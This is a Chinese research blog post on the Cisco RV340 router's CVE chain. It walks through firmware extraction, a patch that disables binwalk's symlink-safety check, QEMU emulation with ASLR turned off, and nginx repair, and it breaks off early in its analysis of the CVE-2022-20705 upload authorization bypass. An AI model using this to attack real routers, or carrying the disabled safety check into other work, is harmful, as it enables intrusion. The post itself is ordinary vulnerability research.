> 附件下载：链接: [https://pan.baidu.com/s/1QZZawEdb98e9r8cnTN_f7g](https://pan.baidu.com/s/1QZZawEdb98e9r8cnTN_f7g) 提取码: 9pbc
>

# 前言
在本篇文章中我们将研究Cisco RV340型号路由器的CVE利用链，采用的固件版本为`RV34X-v1.0.03.22-2021-06-14-02-33-28-AM.img`；使用的研究平台为`ubuntu 18.04.4 TLS`：![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659240794909-105099a6-585f-476c-a37f-b32e97711c0c.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659240938471-c6d4b1c9-85d2-4657-9f81-fc70b2d1053a.png)

解压固件的binwalk使用官方的安装方式进行安装，源码下载链接：[https://github.com/ReFirmLabs/binwalk/archive/refs/tags/v2.3.3.zip](https://github.com/ReFirmLabs/binwalk/archive/refs/tags/v2.3.3.zip)

1. `sudo ./deps.sh`
2. `sudo python3 setup.py install`

# 1、环境搭建
## ①、关于binwalk的选择
对于ubuntu来说，binwalk有两种安装方式，分别是：`sudo apt install binwalk`以及源码安装。这两种安装方式有不小的区别，下面我把我踩的坑大致的叙述一下。

### sudo apt install binwalk
如果你是用的是`ubuntu 18`以上的系统，我十分遗憾的告诉你，binwalk对这些系统的支持不太好，我举个例子就明白了，下面是测试的`ubuntu 20.04.3 LTS`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659242182884-6c63331e-4bc1-4882-b1db-753c8347ebd0.png)

使用apt安装binwalk，然后对cisco的固件解压：`binwalk -e openwrt-comcerto2000-hgw-rootfs-ubi_nand.img`（关于这个img的由来后续会提到）：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659242402492-ae93f9d7-8867-4381-aa99-c86987479587.png)

binwalk识别出来了该镜像为ubi文件系统镜像，但是却提示无法解压，提示没有`ubireader_extract_files`。出现这些问题的原因十分的简单，就是apt并不会安装<u>解压ubi文件系统</u>的依赖库，最终造成了解压了但又完全没有解压的情况：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659242577494-6593404a-d30c-4edc-a7a5-9b2fd0214975.png)

### 使用源码方式安装
> + 截止到笔者开始写此篇文章，binwalk最新的release版本为binwalk-2.3.3。
>

不同ubuntu版本下所需要安装binwalk的依赖不同，这一点可以在安装依赖的脚本`./deps.sh`体现：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659242996693-5e9d55b0-cb8b-4e4b-ace9-e9ac35555e86.png)

很清楚的可以看到官方还没有适配ubuntu 18以上的版本，这时有的师傅可能会说，你将"18"改为"20"不就行了吗？还是很抱歉，我曾经这样尝试过但最终失败。这是因为`ubuntu 18`与`ubuntu 20`大版本的有些依赖包发生了变化，根本安装不上去。所以为了避免麻烦，个人还是推荐直接使用ubuntu 18版本以源码的方式安装binwalk：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659243195928-d1655b70-ac42-4fa1-b5f8-735807abcea9.png)

> 在安装的过程中可能需要建立python3和pip3软链接：
>
> + `sudo ln -s /usr/bin/python3 /usr/bin/python`
> + `sudo ln -s /usr/bin/pip3 /usr/bin/pip`
>

## ②、固件解压
从官方的原版固件说起，尝试使用binwalk -e直接解压固件，却发现无法直接解压出文件系统：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659243487685-0a5d73e5-f261-45da-8f2f-59f70c8fa004.png)

实际上40这个文件是一个tar包，可以直接解压。刚好，binwalk有相应的递归解压命令：`binwalk -Me RV34X-v1.0.03.22-2021-06-14-02-33-28-AM.img`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659855948600-52d2972a-6534-49a3-a42a-95c6dcba522d.png)

> + 以上步骤嫌命令麻烦的话可以直接使用Windows的压缩软件进行解压，比如7-ZIP、WinRAR等。
>

在解压`**openwrt**`的系统文件镜像`openwrt-comcerto2000-hgw-rootfs-ubi_nand.img`的过程中会出现一些警告，如下图所示：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659245367724-85aa8d15-312f-4e72-9ee7-cc4855f392bf.png)

咋这么多警告⚠️？全部都是：`WARNING: Symlink points outside of the extraction directory: 【目录省略...】/ubifs-root/1161918421/rootfs/var -> /tmp; changing link target to /dev/null for security purposes.`，翻译：该软链接指向解压目录之外，为了安全起见binwalk会让它重定向到`/dev/null`，比如：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659245841076-a6195f2c-0662-4a64-b54e-0d1b7e9aaceb.png)

这明显不对嘛，var目录怎么可能指向/dev/null！若抛开这个警告不管，将会在后续的固件模拟中导致一系列的问题。这里采用最简单粗暴的处理方式 -- 修改出现该警告的源码文件`extractor.py`以强行绕过该逻辑：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659246308741-9b81f2ef-25cb-4309-b38c-c922b1a77ff1.png)

打开文件，直接拉到文件末尾：

```python
# 修改前：
if not linktarget.startswith(extraction_directory) and linktarget != os.devnull:
    binwalk.core.common.warning("Symlink points outside of the extraction directory: %s -> %s; changing link target to %s for security purposes." % (file_name, linktarget, os.devnull))
------------------------------------------------------------------------------------------------------------------------------------------------------------------
# 修改后：
if 0 and not linktarget.startswith(extraction_directory) and linktarget != os.devnull:
    binwalk.core.common.warning("Symlink points outside of the extraction directory: %s -> %s; changing link target to %s for security purposes." % (file_name, linktarget, os.devnull))
```

最后`sudo python3 setup.py install`重新安装binwalk即可生效。重新解压查看效果：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659246731504-51ff17ce-007a-4b42-980b-5a0b7ab7c96f.png)

> + 我的建议是对该固件全部研究完成后将extractor.py修改的代码改回来，还原到最初状态才是最好的，毕竟binwalk作者写这个警告肯定有意义，否则他也不会写...
>

## ③、路由器固件模拟（qemu-system）
![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659246999906-ff17db64-662a-46dd-b44a-61fd83c82f55.png)

固件的指令集为ARM，具体的模拟步骤请参照下面代码框：

```shell
# 虚拟机----------------------------------------------------------------------------------------------------------------
# 路由器文件系统打包
$ tar czf rootfs.tar.gz ./rootfs

# 启动ssh
$ service ssh start	

# 配置网卡
$ sudo tunctl -t tap0
$ sudo ifconfig tap0 192.168.2.1/24

# qemu启动（账号密码均为root）
$ sudo qemu-system-arm -M vexpress-a9 -kernel vmlinuz-3.2.0-4-vexpress -initrd initrd.img-3.2.0-4-vexpress -drive if=sd,file=debian_wheezy_armhf_standard.qcow2 -append "root=/dev/mmcblk0p2" -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic -smp 4

# qemu----------------------------------------------------------------------------------------------------------------
$ ifconfig eth0 192.168.2.2/24
$ echo 0 > /proc/sys/kernel/randomize_va_space													# 关闭地址随机化
$ service ssh start																											# 启动ssh
$ scp root@192.168.2.1:【虚拟机rootfs.tar.gz目录】 /root/rootfs.tar.gz 【主要虚拟机中要允许ssh登录】
$ tar xzf rootfs.tar.gz 																								# 解压文件系统
$ chmod -R 777 ./rootfs
$ mount -o bind /dev ./rootfs/dev && mount -t proc /proc ./rootfs/proc 	# 重新挂载目录
$ chroot rootfs/ sh																											# 进入shell
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659248065813-a213489a-1f36-4d7f-a967-a52b44fdb71b.png)

> **注意：**`chmod -R 777 ./rootfs`会更改rootfs下的所有文件和文件夹权限为可读可写可执行，这可能对于模拟具有权限分级的系统（root权限、www-data普通权限等）有不小的影响，请继续向后看就知道了。
>

## ④、启动服务
> + 记得先拍摄快照，因为下面也有不少的坑。
>

### 1、尝试直接启动nginx服务
来到包含有许多系统各种服务的启动和停止脚本`/etc/init.d/`，注意到nginx服务脚本：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659248842334-21eda138-e045-42e7-b3de-96dc2a85b6fb.png)

`/etc/init.d/nginx start`直接启动该服务，之后在浏览器访问`https://192.168.2.2/`，得到的结果却是：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659250976750-54e563cf-a076-41a8-9474-3e4a7c550236.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659251286112-173ebbbf-dd3f-42e7-bfc2-0e365dd76ec7.png)

无论是http还是https均是`Connection refused`，注意到在启动的整个过程中出现了不少错误：

```shell
BusyBox v1.23.2 (2021-06-14 02:21:16 IST) built-in shell (ash)

/ # /etc/init.d/nginx start
uci: Entry not found
chown: /var/firmware: No such file or directory
chown: /var/3g-4g-driver: No such file or directory
chown: /var/in_certs: No such file or directory
chown: /var/signature: No such file or directory
chown: /var/language-pack: No such file or directory
chown: /var/configuration: No such file or directory
FAILED: confd_load_schemas(addr, addrlen), Error: system call failed (24): Connection refused, in function run, line 2413
uci: Entry not found
uci: Entry not found
uci: Entry not found
uci: Entry not found
uci: Entry not found
touch: /tmp/stats/certstats.tmp: No such file or directory
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = (unset),
	LC_ALL = (unset),
	LANG = "en_US.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
cp: can't stat '/tmp/stats/certstats.tmp': No such file or directory
FAILED: confd_load_schemas(addr, addrlen), Error: system call failed (24): Connection refused, in function run, line 2413
uci: Entry not found
uci: Entry not found
uci: Entry not found
uci: Entry not found
uci: Entry not found
touch: /tmp/stats/certstats.tmp: No such file or directory
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = (unset),
	LC_ALL = (unset),
	LANG = "en_US.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
cp: can't stat '/tmp/stats/certstats.tmp': No such file or directory
FAILED: confd_load_schemas(addr, addrlen), Error: system call failed (24): Connection refused, in function run, line 2413
uci: Entry not found
uci: Entry not found
uci: Entry not found
uci: Entry not found
uci: Entry not found
touch: /tmp/stats/certstats.tmp: No such file or directory
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = (unset),
	LC_ALL = (unset),
	LANG = "en_US.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
cp: can't stat '/tmp/stats/certstats.tmp': No such file or directory
Collected errors:
 * opkg_conf_load: Could not create lock file /var/lock/opkg.lock: No such file or directory.
nginx: [emerg] open() "/var/lock/nginx.lock.accept" failed (2: No such file or directory)
uci: Entry not found
/ # [uWSGI] getting INI configuration from /etc/uwsgi/blockpage.ini
[uWSGI] getting INI configuration from /etc/uwsgi/jsonrpc.ini
[uWSGI] getting INI configuration from /etc/uwsgi/upload.ini
*** Starting uWSGI 2.0.15 (32bit) on [Sun Jul 31 06:57:39 2022] ***
*** Starting uWSGI 2.0.15 (32bit) on [Sun Jul 31 06:57:39 2022] ***
compiled with version: 4.8.3 on 14 June 2021 02:22:09
*** Starting uWSGI 2.0.15 (32bit) on [Sun Jul 31 06:57:39 2022] ***
os: Linux-3.2.0-4-vexpress #1 SMP Debian 3.2.51-1
compiled with version: 4.8.3 on 14 June 2021 02:22:09
nodename: debian-armhf
machine: armv7l
os: Linux-3.2.0-4-vexpress #1 SMP Debian 3.2.51-1
clock source: unix
nodename: debian-armhf
pcre jit disabled
machine: armv7l
clock source: unix
detected number of CPU cores: 4
pcre jit disabled
detected number of CPU cores: 4
current working directory: /
current working directory: /
detected binary path: /usr/sbin/uwsgi
detected binary path: /usr/sbin/uwsgi
compiled with version: 4.8.3 on 14 June 2021 02:22:09
os: Linux-3.2.0-4-vexpress #1 SMP Debian 3.2.51-1
nodename: debian-armhf
machine: armv7l
clock source: unix
pcre jit disabled
detected number of CPU cores: 4
current working directory: /
detected binary path: /usr/sbin/uwsgi
setgid() to 33
setgid() to 33
setgid() to 33
setuid() to 33
setuid() to 33
setuid() to 33
your processes number limit is 961
your processes number limit is 961
your memory page size is 4096 bytes
your memory page size is 4096 bytes
detected max file descriptor number: 1024
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
lock engine: pthread robust mutexes
your processes number limit is 961
your memory page size is 4096 bytes
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
thunder lock: disabled (you can enable it with --thunder-lock)
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address 127.0.0.1:9003 fd 3
uwsgi socket 0 bound to TCP address 127.0.0.1:9000 fd 3
uwsgi socket 0 bound to TCP address 127.0.0.1:9001 fd 3
your server socket listen backlog is limited to 100 connections
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
your mercy for graceful operations on workers is 60 seconds
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
mapped 128512 bytes (125 KB) for 1 cores
*** Operational MODE: single process ***
initialized CGI path: /www/cgi-bin/upload.cgi
*** no app loaded. going in full dynamic mode ***
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 2637)
mapped 321280 bytes (313 KB) for 4 cores
mapped 128512 bytes (125 KB) for 1 cores
*** Operational MODE: preforking ***
initialized CGI mountpoint: /jsonrpc = /www/cgi-bin/jsonrpc.cgi
*** no app loaded. going in full dynamic mode ***
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 2635)
*** Operational MODE: single process ***
initialized CGI mountpoint: /blocked.php = /www/cgi-bin/blockpage.cgi
*** no app loaded. going in full dynamic mode ***
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 2636)
spawned uWSGI worker 1 (pid: 2639, cores: 1)
spawned uWSGI worker 1 (pid: 2638, cores: 1)
spawned uWSGI worker 2 (pid: 2640, cores: 1)
spawned uWSGI worker 3 (pid: 2641, cores: 1)
spawned uWSGI worker 4 (pid: 2642, cores: 1)
spawned uWSGI worker 1 (pid: 2643, cores: 1)
```

### 2、修复nginx的启动异常
> 实在是头疼，怎么能出现这么多的报错，裂开......哎，老老实实的处理吧。
>

+ `FAILED: confd_load_schemas(addr, addrlen), Error: system call failed (24):Connection refused, in function run, line 2413`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659251680903-ca632d25-614d-43b4-b469-757d1f481ff4.png)

在文件系统搜索关键词`confd_load_schemas`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659251834302-bfbeab47-89db-4852-abfb-2552198c3c1e.png)

牵扯到的可执行文件有点多。换一种思路，因为是启动服务的时候报出的错误，在`./etc/init.d/`中搜索`confd`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659251985173-7d5b93e8-05d2-455b-8c7b-c808c45c7b64.png)

发现有这么一项confd服务，启动它`/etc/init.d/confd start`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659252610865-60249a42-b9e2-4735-a24a-4c55b2185883.png)

+ `cp: can't stat '/etc/ssl/private/Default.pem': No such file or directory`：

字面意思 -- 缺少ssl证书，我们需要寻找到能`生成（generate）``证书（certificate、cert）`的可执行文件或脚本，全局搜索字符串`ssl、generate、cert`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659254032566-34a87f55-8dde-4b53-9ca9-c1a5a0c301d8.png)

结果共有三个包含对应代码的文件：

    - `./usr/bin/generate-csr`：脚本名字明显不符合要求
    - `./usr/bin/generate-cert`与`./usr/bin/generate_default_cert`：名字都符合，就采用后者吧，生成一个"默认”的证书即可。

执行`generate_default_cert`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659254446045-a37f99c3-b685-4227-9ebe-631975209ebc.png)

+ `uci: Entry not found`：

这个错误何止熟悉，我都快背会了都，在前面的步骤中我们一直没有处理。经过搜索发现在`/usr/sbin`中有一个名为`uci`的可执行文件：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659254762054-dd70125c-23ee-41ce-8462-0791e1cee743.png)

报错的字符串并没有在`uci`中搜索到，相反而是搜索到了其它几个可执行文件：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659663580114-0d314edc-5df9-47b9-be3c-ece610e9b0e6.png)

究竟是哪一个可执行文件出了问题？根据`generate_default_cert`脚本，我们随便摘条指令：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659256733133-160b636a-3c64-4fbb-a098-8ef66f180c50.png)

`uci set`......，不用看了，一定是`uci`的错误。和之前的分析结合，`Entry not found`出现在其调用的动态链接库中，不出意外应该就是`./lib/libuci`。稳妥起见，下面我们再确定一下。比如：`uci set certificate.Default.type=0`，使用虚拟机的`qemu-arm-static`启动：

```shell
[目录省略]/rootfs $ cp $(which qemu-arm-static) .
[目录省略]/rootfs $ sudo chmod +x ./sbin/uci
[目录省略]/rootfs $ sudo chroot . ./qemu-arm-static ./sbin/uci set certificate.Default.type=0
```

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659319307241-1c225fb7-a448-49f4-b7f3-810becf1d464.png)

得，没跑了，`uci`拖入到IDA分析，再辅以动态调试：`sudo chroot . ./qemu-arm-static -g 1234 ./sbin/uci set certificate.Default.type=0`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659319458559-302fd79f-35ac-4dcf-89a5-9cf36a440010.png)

根据动态调试得到的结果，首先要进入`sub_11908`进行命令解析，根据传入的参数设置标志位：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659319542083-4485e578-65f0-4955-bbde-bad2c8179533.png)

紧接着执行124行的`uci_import`，执行失败后进入`sub_11464`函数：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659319971647-72518aa8-7be6-4786-b258-0f7bb285447c.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659320080109-f1f5476a-c458-40e9-838a-a931dcb005b5.png)

`uci_perror`定义在库`libuci.so`中：调用链为`uci_perror ->  uci_get_errorstr`，它有两处能printf的地方：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659321353568-2eb37536-d8f8-4974-ac3d-436654555d43.png)

`fprintf`的参数不一定要通过调试得到，在网上搜索报这个错的原因似乎是缺少配置文件：

> [https://blog.csdn.net/wgl307293845/article/details/121470419](https://blog.csdn.net/wgl307293845/article/details/121470419)
>

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659321588130-ccc5fa86-da11-4ef4-97f0-97e62ee66433.png)

`/etc/config/`目录？尝试在`libuci.so`中搜索`"/"`，来到：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659321665770-ba9fc375-749c-4440-bc69-5dc5e8796da3.png)

结合CSDN那位师傅的分析，似乎是缺失`/tmp/etc/config`目录。既然是没有目录，在执行`generate_default_cert`之前一定是创建了config文件夹，使用`grep`命令搜索`mkdir -p /tmp/etc/config`字符串：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659322472033-2286bfae-3dc6-4f51-9474-3196a1f7e4b3.png)

嘿，还真有，vscode打开`./etc/init.d/boot`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659322833944-64eb0aba-104b-4350-944c-acbb78c01fa4.png)

**<font style="color:#E8323C;">所以该路由器的模拟步骤为：</font>**

```shell
# qemu----------------------------------------------------------------------------------------------------------------
$ ifconfig eth0 192.168.2.2/24
$ echo 0 > /proc/sys/kernel/randomize_va_space													# 关闭地址随机化
$ service ssh start																											# 启动ssh
$ scp root@192.168.2.1:【虚拟机rootfs.tar.gz目录】 /root/rootfs.tar.gz 【主要虚拟机中要允许ssh登录】
$ tar xzf rootfs.tar.gz 																								# 解压文件系统
$ chmod -R 777 ./rootfs
$ mount -o bind /dev ./rootfs/dev && mount -t proc /proc ./rootfs/proc 	# 重新挂载目录
$ chroot rootfs/ sh																											# 进入shell
```

> + 别忘了配置虚拟机ip：`cyberangel@cyberangel:~$ sudo ifconfig tap0 192.168.2.1/24`
>

1. `**<font style="color:#E8323C;">/etc/init.d/boot boot</font>**`**<font style="color:#E8323C;">：创建/tmp/etc/config/文件夹：</font>**

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659665380184-332eb22e-97e3-4661-9dc0-42d29c8af3bf.png)

`/tmp/etc/config/certificate`文件为空，日志如下：

```shell
/ # /etc/init.d/boot boot
uci: Entry not found
uci: Entry not found
uci: Entry not found
mount: mounting debugfs on /sys/kernel/debug failed: No such file or directory
Mounting mnt partitions..mount: mounting /dev/mtdblock9 on /mnt/configcert failed: No such device
mount: mounting /dev/mtdblock10 on /mnt/avcsign failed: No such device
mount: mounting /dev/mtdblock11 on /mnt/webrootdb failed: No such device
mount: mounting /dev/mtdblock12 on /mnt/license failed: No such device
done.
cp: can't stat '/etc/ssl/private/*': No such file or directory
cp: can't stat '/tmp/.KEYS_DIR_TMP/*': No such file or directory
uci: Parse error (option/list command found before the first section) at line 2637, byte 1
 create_meta_data_xml begin
 meta_data_gen_state: 0
 meta_data_gen_state: 1
 create_meta_data_xml end
/ # 
```

2. `**<font style="color:#E8323C;">generate_default_cert</font>**`**<font style="color:#E8323C;">：生成默认的证书文件。</font>**

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659665510190-674ac25e-9953-4509-bd87-c2e8807e2578.png)

```shell
/ # generate_default_cert
touch: /tmp/stats/certstats.tmp: No such file or directory
/usr/bin/certscript: line 1: can't create /tmp/stats/certstats.tmp: nonexistent directory
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = (unset),
	LC_ALL = (unset),
	LANG = "en_US.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
cp: can't stat '/tmp/stats/certstats.tmp': No such file or directory
Default
/ # 
```

3. `**<font style="color:#E8323C;">/etc/init.d/confd start</font>**`**<font style="color:#E8323C;">，启动</font>**`**<font style="color:#E8323C;">confd</font>**`**<font style="color:#E8323C;">服务：</font>**

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659667552140-56c09eaa-0fb1-42a5-83be-76ced912c1a2.png)

4. `**<font style="color:#E8323C;">/etc/init.d/nginx start</font>**`**<font style="color:#E8323C;">，启动nginx服务，日志如下：</font>**

```shell
/ # /etc/init.d/nginx start
chown: /var/firmware: No such file or directory
chown: /var/3g-4g-driver: No such file or directory
chown: /var/in_certs: No such file or directory
chown: /var/signature: No such file or directory
chown: /var/language-pack: No such file or directory
chown: /var/configuration: No such file or directory
FAILED: maapi_get_elem(ms, mtid, &val, argv[0]), Error: item does not exist (1): /firewall-basic-settings:firewall/remote-web-management/cert does not exist, in function do_maapi_get, line 1463
touch: /tmp/stats/certstats.tmp: No such file or directory
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = (unset),
	LC_ALL = (unset),
	LANG = "en_US.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
cp: can't stat '/tmp/stats/certstats.tmp': No such file or directory
FAILED: maapi_get_elem(ms, mtid, &val, argv[0]), Error: item does not exist (1): /ciscosb-restconf:ciscosb-restconf/transport/https/cert does not exist, in function do_maapi_get, line 1463
touch: /tmp/stats/certstats.tmp: No such file or directory
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = (unset),
	LC_ALL = (unset),
	LANG = "en_US.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
cp: can't stat '/tmp/stats/certstats.tmp': No such file or directory
FAILED: maapi_get_elem(ms, mtid, &val, argv[0]), Error: item does not exist (1): /ciscosb-netconf:ciscosb-netconf/transport/ssh/cert does not exist, in function do_maapi_get, line 1463
touch: /tmp/stats/certstats.tmp: No such file or directory
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = (unset),
	LC_ALL = (unset),
	LANG = "en_US.UTF-8"
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
cp: can't stat '/tmp/stats/certstats.tmp': No such file or directory
/ # [uWSGI] getting INI configuration from /etc/uwsgi/blockpage.ini
[uWSGI] getting INI configuration from /etc/uwsgi/upload.ini
[uWSGI] getting INI configuration from /etc/uwsgi/jsonrpc.ini
*** Starting uWSGI 2.0.15 (32bit) on [Fri Aug  5 02:46:43 2022] ***
*** Starting uWSGI 2.0.15 (32bit) on [Fri Aug  5 02:46:43 2022] ***
*** Starting uWSGI 2.0.15 (32bit) on [Fri Aug  5 02:46:43 2022] ***
compiled with version: 4.8.3 on 14 June 2021 02:22:09
compiled with version: 4.8.3 on 14 June 2021 02:22:09
os: Linux-3.2.0-4-vexpress #1 SMP Debian 3.2.51-1
compiled with version: 4.8.3 on 14 June 2021 02:22:09
os: Linux-3.2.0-4-vexpress #1 SMP Debian 3.2.51-1
nodename: Router
os: Linux-3.2.0-4-vexpress #1 SMP Debian 3.2.51-1
nodename: Router
machine: armv7l
nodename: Router
clock source: unix
machine: armv7l
machine: armv7l
clock source: unix
pcre jit disabled
pcre jit disabled
clock source: unix
detected number of CPU cores: 4
detected number of CPU cores: 4
pcre jit disabled
current working directory: /
detected number of CPU cores: 4
current working directory: /
current working directory: /
detected binary path: /usr/sbin/uwsgi
detected binary path: /usr/sbin/uwsgi
detected binary path: /usr/sbin/uwsgi
setgid() to 33
setgid() to 33
setgid() to 33
setuid() to 33
setuid() to 33
setuid() to 33
your processes number limit is 961
your processes number limit is 961
your processes number limit is 961
your memory page size is 4096 bytes
your memory page size is 4096 bytes
detected max file descriptor number: 1024
your memory page size is 4096 bytes
lock engine: pthread robust mutexes
detected max file descriptor number: 1024
detected max file descriptor number: 1024
lock engine: pthread robust mutexes
lock engine: pthread robust mutexes
thunder lock: disabled (you can enable it with --thunder-lock)
thunder lock: disabled (you can enable it with --thunder-lock)
thunder lock: disabled (you can enable it with --thunder-lock)
uwsgi socket 0 bound to TCP address 127.0.0.1:9000 fd 3
uwsgi socket 0 bound to TCP address 127.0.0.1:9003 fd 3
uwsgi socket 0 bound to TCP address 127.0.0.1:9001 fd 3
your server socket listen backlog is limited to 100 connections
your server socket listen backlog is limited to 100 connections
your server socket listen backlog is limited to 100 connections
your mercy for graceful operations on workers is 60 seconds
your mercy for graceful operations on workers is 60 seconds
your mercy for graceful operations on workers is 60 seconds
mapped 128512 bytes (125 KB) for 1 cores
mapped 128512 bytes (125 KB) for 1 cores
*** Operational MODE: single process ***
*** Operational MODE: single process ***
initialized CGI mountpoint: /blocked.php = /www/cgi-bin/blockpage.cgi
initialized CGI path: /www/cgi-bin/upload.cgi
*** no app loaded. going in full dynamic mode ***
*** no app loaded. going in full dynamic mode ***
*** uWSGI is running in multiple interpreter mode ***
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 4744)
spawned uWSGI master process (pid: 4745)
mapped 321280 bytes (313 KB) for 4 cores
spawned uWSGI worker 1 (pid: 4747, cores: 1)
spawned uWSGI worker 1 (pid: 4746, cores: 1)
*** Operational MODE: preforking ***
initialized CGI mountpoint: /jsonrpc = /www/cgi-bin/jsonrpc.cgi
*** no app loaded. going in full dynamic mode ***
*** uWSGI is running in multiple interpreter mode ***
spawned uWSGI master process (pid: 4743)
spawned uWSGI worker 1 (pid: 4748, cores: 1)
spawned uWSGI worker 2 (pid: 4749, cores: 1)
spawned uWSGI worker 3 (pid: 4750, cores: 1)
spawned uWSGI worker 4 (pid: 4751, cores: 1)

```

### 3、验证nginx服务是否正常
![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659667708954-d1db8329-65dc-4e9b-8c29-eeab94833c86.png)

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659667720768-d0570056-6c80-465e-8092-c42ec2894ed9.png)

虽然在启动的过程中仍有一些报错，但是这里只要求能够正常访问web就可以了。

### 4、补充（Linux系统的启动过程）
换一个角度来分析，我们来到`/etc/rc.d/`文件夹，其中的脚本都是软链接到了`/etc/init.d/`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659312868758-98cbecbb-d804-4450-bfcc-f2d427ac7d0d.png)

该文件系统基于openwrt，而openwrt基于Linux，下面的这一小段内容可能会对你更好理解前面修复nginx服务的启动过程。

+ 计算机加电启动后会加载Linux kernel并启动init进程，该进程会加载所需的系统进程，即所有的系统进程均为init的子进程。在**<font style="color:#E8323C;">该</font>**基于Linux的嵌入式系统openwrt固件中，它不区分`运行级别（runlevel）`，所以`按照脚本名称中的数字由小到大的顺序``以start为参数`依次启动`/etc/rc.d/`文件夹中所有脚本，如上图所示。脚本以S开头表示`启动（Start）`某一项服务，以`K（kill）`开头就是停止某服务。例如，`S10boot`文件名中的数字会先于`S21confd`执行。另外我们能发现`K78system`和`S22system`都链接到了同一个文件`/etc/init.d/system`中：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659315585481-4ae4fe6f-1738-42c0-ab77-8eb377753297.png)

说了这么多又有什么用呢？很有用，根据前面的内容，nginx服务启动的步骤如下：

1. `**<font style="color:#E8323C;">/etc/init.d/boot boot</font>**`
2. `**<font style="color:#E8323C;">generate_default_cert（生成证书）</font>**`
3. `**<font style="color:#E8323C;">/etc/init.d/confd start</font>**`
4. `**<font style="color:#E8323C;">/etc/init.d/nginx start</font>**`

对照到`/etc/rc.d`：

![](https://cdn.nlark.com/yuque/0/2022/png/574026/1659668489694-918f7496-ce63-4f07-9d6b-0a74a4957e3d.png)

是不是顺序一模一样？

# 2、CVE利用链
> + 注：路由器管理界面的初始账号和密码均为`cisco`
>

### ①、CVE-2022-20705（不正确的会话管理）
#### 漏洞解析-part 1
该CVE主要利用了nginx配置不恰当导致的授权绕过漏洞，针对文件上传接口`upload`。该版本的固件中nginx配置文件如下：

```nginx
[目录省略]/etc/nginx/conf.d/: $ sudo cat ./web.upload.conf
location /form-file-upload {
	include uwsgi_params;
	proxy_buffering off;
	uwsgi_modifier1 9;
	uwsgi_pass 127.0.0.1:9003;
	uwsgi_read_timeout 3600;
	uwsgi_send_timeout 3600;
}

location /upload {
	set $deny 1;

        if (-f /tmp/websession/token/$cookie_sessionid) {
                set $deny "0";
        }

        if ($deny = "1") {
                return 403;
        }

	upload_pass /form-file-upload;
	upload_store /tmp/upload;
	upload_store_access user:rw group:rw all:rw;
	upload_set_form_field $upload_field_name.name "$upload_file_name";
	upload_set_form_field $upload_field_name.content_type "$upload_content_type";
